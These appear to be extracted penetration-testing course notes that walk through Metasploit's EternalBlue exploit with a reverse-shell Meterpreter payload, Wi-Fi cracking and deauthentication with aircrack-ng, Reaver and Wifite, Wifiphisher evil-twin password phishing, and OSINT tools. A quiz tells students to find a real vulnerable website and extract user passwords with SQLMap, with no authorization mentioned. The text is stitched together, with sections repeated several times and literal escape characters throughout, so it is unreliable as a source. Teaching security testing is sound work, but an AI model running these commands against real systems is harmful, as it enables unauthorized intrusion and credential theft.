## Lecture 5: Metasploit Framework

**What is Metasploit Framework?**
Metasploit Framework is an open-source penetration testing framework used for developing, testing, and executing exploits against vulnerable systems. It\'s a comprehensive suite of tools that allows users to exploit security vulnerabilities in an organized and effective manner.

**Key Components:**
*   **Exploits:** Software units designed to take advantage of a specific security vulnerability in a system or application.
*   **Payloads:** The code executed on the target system after a successful exploit. Examples include reverse shells or Meterpreter sessions.
*   **Auxiliary Modules:** Tools that assist in information gathering (e.g., port scanning) or other tasks that precede exploitation.
*   **Encoders:** Used to obfuscate payloads to avoid detection by antivirus software.

**How to Use:**
`msfconsole` is the main interface for Metasploit Framework. It allows the tester to select the appropriate exploit, payload, define the target, and then execute the attack.

**Sections in Metasploit Interface:**
1.  **RECON (Blue):** For reconnaissance and information gathering before exploitation (e.g., port scanning, OS detection, service discovery).
2.  **EXPLOIT (Green):** For exploiting vulnerabilities using available exploit modules.
3.  **PAYLOAD (Red):** The malicious code injected into the target after successful exploitation.
4.  **LOOT (Yellow):** Data collected after exploitation (e.g., screenshots, files, passwords).

**Metasploit Architecture:**
*   **Databases:** Used to store information about targets and scan results.
*   **Plugins:** Add new functionalities to Metasploit.
*   **Modules:** The core of Metasploit, divided into Auxiliary, Encoders, Exploits, NOPs, Payloads, and Post-exploitation modules.
*   **Encoders:** Used to change the appearance of payloads to evade detection.
*   **Payloads:** Code that runs on the target system after exploitation, categorized into Singles, Stagers, and Stages.
*   **Targets:** The applications, devices, or systems that are targeted by exploitation or testing operations.

**Practical Example: Exploiting MS17-010 (EternalBlue) with Metasploit**
1.  **Start Metasploit:** `msfconsole`
2.  **Search for the exploit:** `search ms17_010`
3.  **Select the exploit:** `use exploit/windows/smb/ms17_010_eternalblue`
4.  **Show options:** `show options` (to see required parameters like RHOSTS, LHOST, LPORT)
5.  **Set target IP:** `set RHOSTS 192.168.20.206`
6.  **Set payload:** `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
7.  **Set attacker IP:** `set LHOST 192.168.20.248`
8.  **Run the exploit:** `exploit` or `run`

**Expected Outcome:** A Meterpreter session (`meterpreter >`) allowing execution of commands like `sysinfo`, `getuid`, `ipconfig`, `netstat`, `ps`, `ls`, `cat`, `download`, `upload`, `hashdump`, `screenshot`, `webcam_list`, `keyscan_start`, `shell`, `execute`, `background`, `reboot`, `shutdown`.

**Important Note:** EternalBlue is a very dangerous vulnerability (responsible for WannaCry).


## Lecture 6: Information Security

**Note:** The content of this lecture was primarily images and diagrams, making direct text extraction difficult. Key concepts include:

*   **Information Security Principles:** Confidentiality, Integrity, Availability (CIA Triad).
*   **Threats and Vulnerabilities:** Common types of cyber threats (malware, phishing, DoS) and system vulnerabilities.

*   **Security Controls:** Technical, administrative, and physical controls to mitigate risks.
*   **Risk Management:** Identifying, assessing, and treating information security risks.
*   **Security Policies and Procedures:** Importance of establishing clear guidelines for information security.




## Lecture 7: Wireless Network Penetration Tools

**Tools used by security experts to assess wireless network security:**

### Aircrack-ng
A comprehensive suite of tools for assessing Wi-Fi network security. It\'s not a single tool but a collection used for packet capturing, cracking WEP/WPA/WPA2-PSK encryption keys, and deauthentication attacks.

**Key Tools within Aircrack-ng Suite:**
*   `airmon-ng`: Used to enable/disable monitor mode on wireless network cards.
*   `airodump-ng`: Used to scan for surrounding wireless networks, collect vital information (BSSID, ESSID, channel, encryption type), and capture authentication handshakes.
*   `aireplay-ng`: Used for packet injection, speeding up handshake collection, and performing deauthentication attacks.
*   `aircrack-ng`: The main tool for cracking WEP/WPA/WPA2 encryption keys after sufficient data is collected.

**Practical Application: Testing WPA/WPA2 Network Penetration:**
1.  **Enable Monitor Mode:** `sudo airmon-ng start wlan0`
2.  **Capture Data and Scan Networks:** `sudo airodump-ng --bssid [AP_BSSID] -c [channel] -w [filename] wlan0mon`
3.  **Deauthentication Attack (Optional but Recommended):** `sudo aireplay-ng --deauth 0 -a [AP_BSSID] -c [Client_MAC] wlan0mon`
4.  **Crack the Password:** `aircrack-ng -w [path_to_wordlist] -b [AP_BSSID] [filename].cap`

### Kismet
A powerful tool for discovering and analyzing wireless networks, excelling in passive reconnaissance. It can detect hidden SSIDs and collect traffic for later analysis without sending any packets, making it stealthy.

**Key Features of Kismet:**
*   **Passive Reconnaissance:** Listens to air traffic without transmitting, making it undetectable.
*   **Hidden Network Discovery:** Discovers hidden SSIDs by capturing packets from connected clients.
*   **Client/Server Architecture:** Can run on a remote device (e.g., Raspberry Pi) and be controlled via a web interface.
*   **Multi-source Support:** Can integrate data from multiple Wi-Fi cards, SDR, and Bluetooth devices.
*   **Geolocation:** Records geographical coordinates when connected to a GPS device, useful for war-driving.
*   **Advanced Alert System:** Detects suspicious activities like deauthentication attacks or WPS attempts.

**Comparison: Airodump-ng vs. Kismet:**
*   **Airodump-ng:** Targeted, active scanning for specific data (e.g., handshakes). Command-line interface.
*   **Kismet:** Broad, passive reconnaissance for comprehensive network analysis. Modern web interface. Supports multiple technologies (Wi-Fi, Bluetooth, SDR).

### Reaver
A specialized tool for exploiting the WPS (Wi-Fi Protected Setup) protocol vulnerability. WPS allows connecting devices via an 8-digit PIN, which has a critical design flaw allowing brute-force attacks in a few hours.

**Key Features of Reaver:**
*   **Brute-force WPS PIN:** Tries all possible PIN combinations.
*   **Password Recovery:** Recovers the WPA/WPA2 PSK after finding the correct PIN.
*   **Pixie-Dust Attack:** Exploits a weakness in some routers that generate non-random PINs, allowing PIN recovery in seconds.

**Practical Application: Attacking a WPS-enabled Network:**
1.  **Identify Target:** Use `wash -i wlan0mon` to scan for WPS-enabled networks.
2.  **Start Attack:** `sudo reaver -i wlan0mon -b [AP_BSSID] -c [channel] -vv`
3.  **Monitor Progress:** Reaver will attempt PINs and show progress.
4.  **Result:** If successful, Reaver displays the WPS PIN and the WPA PSK.

**Note:** Many modern routers have protection against this attack (temporary WPS lockout). It\'s always recommended to disable WPS in router settings.

### Wifite
An automated script written in Python designed to simplify and speed up wireless network attacks. It automates the use of well-known tools like Aircrack-ng and Reaver based on the detected network type.

**Key Features of Wifite:**
*   **Full Automation:** Automatically scans for networks and launches appropriate attacks (WEP, WPA, WPS).
*   **Ease of Use:** Presents a numbered list of available networks; user only needs to select the target.
*   **Multiple Attacks:** Supports WEP (Replay/Fragmentation), WPA/WPA2 (Handshake capture, Brute-force, Pixie-Dust).
*   **Target Sorting:** Sorts networks by encryption type and signal strength to prioritize weaker targets.

**Practical Application: Quick Attack on Surrounding Networks:**
1.  **Run the Tool:** `sudo wifite`
2.  **Scan and Select:** Wifite will scan and display a list of networks. Select the target(s) by number.
3.  **Start Attack:** Wifite automatically launches the best attack for the selected target.
4.  **Get Password:** If successful, Wifite displays the password and saves it to `cracked.txt`.

### Fern Wi-Fi Cracker
A wireless network penetration testing tool with a graphical user interface (GUI) written in Python. Its main goal is to simplify the process of attacking Wi-Fi networks for users who are not comfortable with command-line interfaces.

**Key Features of Fern Wi-Fi Cracker:**
*   **Simple GUI:** Everything is done through buttons and windows.
*   **Automated Operations:** Automates the attack steps from scanning to key cracking.
*   **Multiple Attack Support:** Supports WEP, WPA/WPA2, and WPS attacks.
*   **Other Attacks:** Includes deauthentication attacks and Evil Twin attacks for phishing.
*   **Session Tracking:** Saves discovered passwords in its own database.

**Practical Application: Cracking a WPA Network using Fern:**
1.  **Run the Tool:** `sudo fern-wifi-cracker`
2.  **Select Network Card:** Choose your wireless network card from the dropdown menu (it will automatically go into monitor mode).
3.  **Scan Networks:** Click \"Scan for Access Points\" to find surrounding networks.\n4.  **Select Target and Start Attack:** Choose the target network (e.g., WPA) and click \"Wi-Fi Attack\". Select a wordlist for brute-force.\n5.  **Monitor Attack:** Fern will run `airodump-ng` and `aireplay-ng` in the background to capture the handshake, then `aircrack-ng` to crack the password.\n6.  **Result:** If the password is found in the wordlist, a pop-up will show it and save it to the \"Key Database\" section.\n
### Wifiphisher: The Phishing Artist
Wifiphisher is a powerful and specialized tool for performing advanced phishing attacks against Wi-Fi networks. Unlike tools that try to crack encryption, Wifiphisher focuses on exploiting the human element.

**How Wifiphisher Works:**
It automates the \"Evil Twin\" attack by creating a fake Access Point that looks exactly like a legitimate network. It then forces users off the real network and onto the fake one to steal their credentials.\n
**Key Features of Wifiphisher:**
*   **Full Automation:** Automatically creates a fake AP, DHCP server, web server, and performs deauthentication attacks.\n*   **Realistic Phishing Pages:** Comes with ready-made templates mimicking common login pages (e.g., router firmware update, network manager connect, OAuth login).\n*   **No Encryption Cracking Required:** It bypasses encryption cracking by tricking the user into providing the password themselves.\n*   **Customizable and Flexible:** Allows creating custom phishing templates.\n*   **Highly Effective:** Targets the human element, making it effective even against secure networks.\n
**Practical Application: Stealing WPA2 Password via Phishing:**
1.  **Run the Tool:** `sudo wifiphisher`
2.  **Setup and Selection:** Wifiphisher scans for networks. Select the target network.\n3.  **Choose Attack Scenario:** Select a phishing scenario (e.g., \"Router Firmware Update\" is often effective).\n4.  **Start Attack:** Wifiphisher creates the fake AP, performs deauthentication attacks, and redirects users to the phishing page.\n5.  **Result:** When the victim enters the password on the fake page, it appears directly in the Wifiphisher terminal.\n
**Important Note:** Wifiphisher demonstrates that even the strongest encryption can be bypassed if the human element is compromised. It emphasizes the importance of user awareness as a primary defense line in cybersecurity.




## Lecture: SQLMap Quiz

**Quiz Objective:**
Search for a website containing SQL vulnerabilities. Exploit it to gain access to user and database information, including passwords.\n\n**Time Limit:** 20 minutes\n**Points:** 3\n



## Lecture 2: Information Gathering

Information gathering is a fundamental process in penetration testing and ethical hacking. The more information you have about a target, the easier it is to plan and execute attacks.\n
**Common Tools for Information Gathering:**
*   Whois
*   nslookup\n*   theHarvester\n*   Recon-ng\n*   Maltego (Community Edition)\n
### Whois\nWhois is a tool used to query information about domain names or IP addresses via the Whois protocol. It provides details like domain owner, registrar, contact information, and creation/expiration dates.\n\n**Usage:**\n*   `whois example.com`\n*   `whois 8.8.8.8`\n
### nslookup\nnslookup is a tool to check DNS records related to a domain.

## Lecture 5: Metasploit Framework

**What is Metasploit Framework?**
Metasploit Framework is an open-source penetration testing framework used for developing, testing, and executing exploits against vulnerable systems. It\'s a comprehensive suite of tools that allows users to exploit security vulnerabilities in an organized and effective manner.

**Key Components:**
*   **Exploits:** Software units designed to take advantage of a specific security vulnerability in a system or application.
*   **Payloads:** The code executed on the target system after a successful exploit. Examples include reverse shells or Meterpreter sessions.
*   **Auxiliary Modules:** Tools that assist in information gathering (e.g., port scanning) or other tasks that precede exploitation.
*   **Encoders:** Used to obfuscate payloads to avoid detection by antivirus software.

**How to Use:**
`msfconsole` is the main interface for Metasploit Framework. It allows the tester to select the appropriate exploit, payload, define the target, and then execute the attack.

**Sections in Metasploit Interface:**
1.  **RECON (Blue):** For reconnaissance and information gathering before exploitation (e.g., port scanning, OS detection, service discovery).
2.  **EXPLOIT (Green):** For exploiting vulnerabilities using available exploit modules.
3.  **PAYLOAD (Red):** The malicious code injected into the target after successful exploitation.
4.  **LOOT (Yellow):** Data collected after exploitation (e.g., screenshots, files, passwords).

**Metasploit Architecture:**
*   **Databases:** Used to store information about targets and scan results.
*   **Plugins:** Add new functionalities to Metasploit.
*   **Modules:** The core of Metasploit, divided into Auxiliary, Encoders, Exploits, NOPs, Payloads, and Post-exploitation modules.
*   **Encoders:** Used to change the appearance of payloads to evade detection.
*   **Payloads:** Code that runs on the target system after exploitation, categorized into Singles, Stagers, and Stages.
*   **Targets:** The applications, devices, or systems that are targeted by exploitation or testing operations.

**Practical Example: Exploiting MS17-010 (EternalBlue) with Metasploit**
1.  **Start Metasploit:** `msfconsole`
2.  **Search for the exploit:** `search ms17_010`
3.  **Select the exploit:** `use exploit/windows/smb/ms17_010_eternalblue`
4.  **Show options:** `show options` (to see required parameters like RHOSTS, LHOST, LPORT)
5.  **Set target IP:** `set RHOSTS 192.168.20.206`
6.  **Set payload:** `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
7.  **Set attacker IP:** `set LHOST 192.168.20.248`
8.  **Run the exploit:** `exploit` or `run`

**Expected Outcome:** A Meterpreter session (`meterpreter >`) allowing execution of commands like `sysinfo`, `getuid`, `ipconfig`, `netstat`, `ps`, `ls`, `cat`, `download`, `upload`, `hashdump`, `screenshot`, `webcam_list`, `keyscan_start`, `shell`, `execute`, `background`, `reboot`, `shutdown`.

**Important Note:** EternalBlue is a very dangerous vulnerability (responsible for WannaCry).

### Wifiphisher: The Phishing Artist
Wifiphisher is a powerful and specialized tool for performing advanced phishing attacks against Wi-Fi networks. Unlike tools that try to crack encryption, Wifiphisher focuses on exploiting the human element.

**How Wifiphisher Works:**
It automates the \"Evil Twin\" attack by creating a fake Access Point that looks exactly like a legitimate network. It then forces users off the real network and onto the fake one to steal their credentials.\n
**Key Features of Wifiphisher:**
*   **Full Automation:** Automatically creates a fake AP, DHCP server, web server, and performs deauthentication attacks.\n*   **Realistic Phishing Pages:** Comes with ready-made templates mimicking common login pages (e.g., router firmware update, network manager connect, OAuth login).\n*   **No Encryption Cracking Required:** It bypasses encryption cracking by tricking the user into providing the password themselves.\n*   **Customizable and Flexible:** Allows creating custom phishing templates.\n*   **Highly Effective:** Targets the human element, making it effective even against secure networks.\n
**Practical Application: Stealing WPA2 Password via Phishing:**
1.  **Run the Tool:** `sudo wifiphisher`
2.  **Setup and Selection:** Wifiphisher scans for networks. Select the target network.\n3.  **Choose Attack Scenario:** Select a phishing scenario (e.g., \"Router Firmware Update\" is often effective).\n4.  **Start Attack:** Wifiphisher creates the fake AP, performs deauthentication attacks, and redirects users to the phishing page.\n5.  **Result:** When the victim enters the password on the fake page, it appears directly in the Wifiphisher terminal.\n
**Important Note:** Wifiphisher demonstrates that even the strongest encryption can be bypassed if the human element is compromised. It emphasizes the importance of user awareness as a primary defense line in cybersecurity.\n

3.  **Scan Networks:** Click \"Scan for Access Points\" to find surrounding networks.\\n4.  **Select Target and Start Attack:** Choose the target network (e.g., WPA) and click \"Wi-Fi Attack\". Select a wordlist for brute-force.\\n5.  **Monitor Attack:** Fern will run `airodump-ng` and `aireplay-ng` in the background to capture the handshake, then `aircrack-ng` to crack the password.\\n6.  **Result:** If the password is found in the wordlist, a pop-up will show it and save it to the \"Key Database\" section.\n
### Wifiphisher: The Phishing Artist
Wifiphisher is a powerful and specialized tool for performing advanced phishing attacks against Wi-Fi networks. Unlike tools that try to crack encryption, Wifiphisher focuses on exploiting the human element.

**How Wifiphisher Works:**
It automates the \"Evil Twin\" attack by creating a fake Access Point that looks exactly like a legitimate network. It then forces users off the real network and onto the fake one to steal their credentials.\n
**Key Features of Wifiphisher:**
*   **Full Automation:** Automatically creates a fake AP, DHCP server, web server, and performs deauthentication attacks.\n*   **Realistic Phishing Pages:** Comes with ready-made templates mimicking common login pages (e.g., router firmware update, network manager connect, OAuth login).\n*   **No Encryption Cracking Required:** It bypasses encryption cracking by tricking the user into providing the password themselves.\n*   **Customizable and Flexible:** Allows creating custom phishing templates.\n*   **Highly Effective:** Targets the human element, making it effective even against secure networks.\n
**Practical Application: Stealing WPA2 Password via Phishing:**
1.  **Run the Tool:** `sudo wifiphisher`
2.  **Setup and Selection:** Wifiphisher scans for networks. Select the target network.\n3.  **Choose Attack Scenario:** Select a phishing scenario (e.g., \"Router Firmware Update\" is often effective).\n4.  **Start Attack:** Wifiphisher creates the fake AP, performs deauthentication attacks, and redirects users to the phishing page.\n5.  **Result:** When the victim enters the password on the fake page, it appears directly in the Wifiphisher terminal.\n
**Important Note:** Wifiphisher demonstrates that even the strongest encryption can be bypassed if the human element is compromised. It emphasizes the importance of user awareness as a primary defense line in cybersecurity.\n

## Lecture 2: Information Gathering

Information gathering is a fundamental process in penetration testing and ethical hacking. The more information you have about a target, the easier it is to plan and execute attacks.\n
**Common Tools for Information Gathering:**
*   Whois
*   nslookup\n*   theHarvester\n*   Recon-ng\n*   Maltego (Community Edition)\n
### Whois\nWhois is a tool used to query information about domain names or IP addresses via the Whois protocol. It provides details like domain owner, registrar, contact information, and creation/expiration dates.\n\n**Usage:**\n*   `whois example.com`\n*   `whois 8.8.8.8`\n
### nslookup\nnslookup is a tool to check DNS records related to a domain. It can discover IP addresses for domains, MX records for mail, and NS records for name servers.\n
**Usage:**\n*   **To check IP address:** `nslookup example.com`\n*   **To get MX records:** `nslookup -query=mx example.com`\n
**Note:** nslookup is an older tool, but still effective. `dig` is a more modern and professional alternative.\n\n### dig vs. nslookup\n| Feature        | nslookup             | dig                               |\n|----------------|----------------------|-----------------------------------|
| Function       | Simple DNS query     | Detailed and professional DNS query \\n| Output         | Concise, simplified  | Detailed (Header, Question, Answer) \\n| Standards      | Older, sometimes unofficial | Standardized, authoritative       \\n| Interactive Mode | Yes                  | No                                \\n| Output for     | Normal users         | Scripts and professionals         \\n| Availability   | Built-in to most OS  | Needs installation (e.g., `dnsutils`) \\n| Accuracy       | Good                 | More accurate, supports more record types \\n| Use Case       | Simple IP/MX lookup  | Advanced analysis, troubleshooting DNS issues \\n\n**`dig +trace`:** Traces the DNS query from root servers to authoritative servers, showing how a domain name is resolved step-by-step. Useful for analyzing DNS issues and understanding the resolution process.\n\n### theHarvester\ntheHarvester is a powerful tool for gathering public information, domain names, and email addresses using search engines and social networks.\n\n**Usage:**\n*   **To collect emails related to a domain:** `theHarvester -d example.com -b bing`\n*   **To get information from LinkedIn:** `theHarvester -d example.com -b linkedin`\n\n**Options:**\n*   `-d` or `--domain`: Target domain or company name.\n*   `-l` or `--limit`: Number of results to retrieve (default: 500).\n*   `-b` or `--source`: Search engine or source to use (e.g., google, bing, duckduckgo, linkedin).\n*   `--shodan`: Use Shodan to search for discovered devices.\n*   `--screenshot`: Take screenshots of results.\n*   `--dns-brute`: Perform brute-force DNS enumeration.\n\n### Recon-ng\nRecon-ng is an open-source reconnaissance framework similar to Metasploit, but specialized in information gathering. It allows adding modules to collect email addresses, hosts, domains, and contacts.\n\n**How it Works:**\n*   **Interactive Interface:** Works within a command-line environment where you can load modules, set variables, and execute operations.\n*   **Modules:** Each module performs a specific task (e.g., searching for email addresses, extracting domain names).\n*   **Integrated Database:** Automatically saves all collected data for easier analysis.\n*   **Customization:** Allows modifying existing modules or adding new ones.\n\n**Usage:**\n1.  **Run the tool:** `recon-ng`\n2.  **Create a new workspace:** `workspaces create myworkspace`\n3.  **Load a module:** `modules load recon/domains-hosts/bing_domain_web`\n4.  **Set variables:** `set SOURCE example.com`\n5.  **Run the module:** `run`\n6.  **View results:** `show hosts`, `show emails`\n\n### Maltego (Community Edition)\nMaltego is a powerful graphical OSINT tool that allows connecting relationships between entities like email addresses, domain names, IPs, individuals, and social media.\n\n**Usage:**\n1.  Open the tool and create a new project.\n2.  Enter seed data (e.g., an email or domain).\n3.  Run Transforms (e.g., \"To DNS Name\", \"To Email Addresses\", \"To IP Address\").\n4.  Analyze the automatically generated graphical map.\n

## Lecture 8: Social Engineering

**Note:** The content of this lecture was primarily images and diagrams, making direct text extraction difficult. Key concepts include:

*   **Social Engineering Principles:** Manipulation, deception, and psychological tactics used to trick individuals into divulging confidential information or performing actions.\n*   **Common Social Engineering Attacks:** Phishing, pretexting, baiting, tailgating, quid pro quo.\n*   **Human Element in Security:** Emphasizing that humans are often the weakest link in the security chain.\n*   **Prevention and Awareness:** Training and education to raise awareness about social engineering tactics.\n
